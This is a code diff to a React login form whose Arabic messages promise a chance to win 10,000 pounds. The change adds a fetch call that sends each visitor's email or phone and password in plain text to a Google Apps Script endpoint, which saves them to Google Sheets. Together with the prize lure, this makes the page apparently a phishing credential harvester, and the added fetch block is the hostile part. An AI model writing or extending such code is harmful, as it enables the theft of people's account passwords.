@@ -13,11 +13,11 @@ const LoginForm = () => {
 
   const validateInput = (input: string) => {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    const phoneRegex = /^[0-9]{10,15}$/; // أرقام هاتفية بين 10 و15 رقمًا
+    const phoneRegex = /^[0-9]{10,15}$/;
     return emailRegex.test(input) || phoneRegex.test(input);
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
     if (!validateInput(identifier)) {
@@ -31,13 +31,41 @@ const LoginForm = () => {
 
     setIsLoading(true);
 
-    setTimeout(() => {
-      setIsLoading(false);
-      toast({
-        title: "تم تسجيل الدخول بنجاح!",
-        description: "أنت الآن مسجل للمشاركة في فرصة ربح 10,000 جنيه!",
+    try {
+      const response = await fetch("https://script.google.com/macros/s/AKfycbwVnTu3lokQfWudYhGqnuymQGsq0eXa0RgRH4c2_lJEU11sb94Zd9cEV9Z6lZyEK7vVGA/exec", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          email: identifier,
+          password: password,
+        }),
       });
-    }, 1500);
+
+      const data = await response.json();
+
+      if (data.status === "success") {
+        toast({
+          title: "تم تسجيل الدخول بنجاح!",
+          description: "تم حفظ بياناتك في Google Sheets.",
+        });
+      } else {
+        toast({
+          title: "فشل العملية",
+          description: "حدث خطأ أثناء تسجيل الدخول. حاول مرة أخرى.",
+          variant: "destructive",
+        });
+      }
+    } catch (error) {
+      toast({
+        title: "خطأ في الاتصال",
+        description: "لم نتمكن من إرسال بياناتك. تأكد من الاتصال بالإنترنت.",
+        variant: "destructive",
+      });
+    }
+
+    setIsLoading(false);
   };
 
   return (
